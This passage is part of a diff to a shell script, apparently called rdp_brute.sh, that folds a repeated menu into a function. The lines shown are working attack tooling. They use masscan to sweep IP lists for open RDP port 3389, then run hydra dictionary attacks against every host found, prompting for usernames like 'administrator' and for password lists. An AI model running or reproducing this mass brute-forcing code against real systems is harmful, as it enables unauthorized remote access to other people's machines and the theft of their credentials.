-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -22709,6 +9153,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -22718,53 +9163,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -22782,6 +9181,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -22791,53 +9191,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -22855,6 +9209,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -22864,53 +9219,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -22928,6 +9237,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -22937,53 +9247,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -23001,6 +9265,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23010,53 +9275,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -23074,6 +9293,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23083,53 +9303,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -23147,6 +9321,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23156,53 +9331,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -23220,6 +9349,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23229,53 +9359,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -23293,6 +9377,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23302,53 +9387,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -23366,6 +9405,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23375,53 +9415,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -23439,6 +9433,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23448,53 +9443,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -23512,6 +9461,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23521,53 +9471,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -23585,6 +9489,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23594,53 +9499,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -23658,6 +9517,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23667,53 +9527,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -23731,6 +9545,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23740,53 +9555,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
